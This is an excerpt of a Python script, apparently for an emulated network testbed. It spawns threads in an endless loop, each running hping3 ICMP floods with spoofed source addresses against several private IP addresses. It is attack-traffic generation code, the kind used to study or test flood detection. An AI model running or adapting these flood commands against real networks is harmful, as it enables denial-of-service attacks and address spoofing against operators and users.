...
class Attack_flow():
    ...
    def run(self):
        cmd="./host-cmd "+self.host_id+" hping3 --icmp "+self.src_ip+" -a "+self.dst_ip+" -i u128000 -d 1546 -V "
...
def main():
    ...
    dst_ip_arr=["10.0.3.32","10.0.3.31","10.0.3.31","10.0.4.41","10.0.4.42","10.0.4.41","10.0.4.42"]

    for i in range(len(host_id_arr)):
        attack_flow=Attack_flow(host_id_arr[i],dst_ip_arr[i],src_ip_arr[i])
    ...
    while(True):
        ...
        for id in id_arr:
            t = threading.Thread(target=attack_flow_arr[id].run,name="job"+str(id))
            t.start()
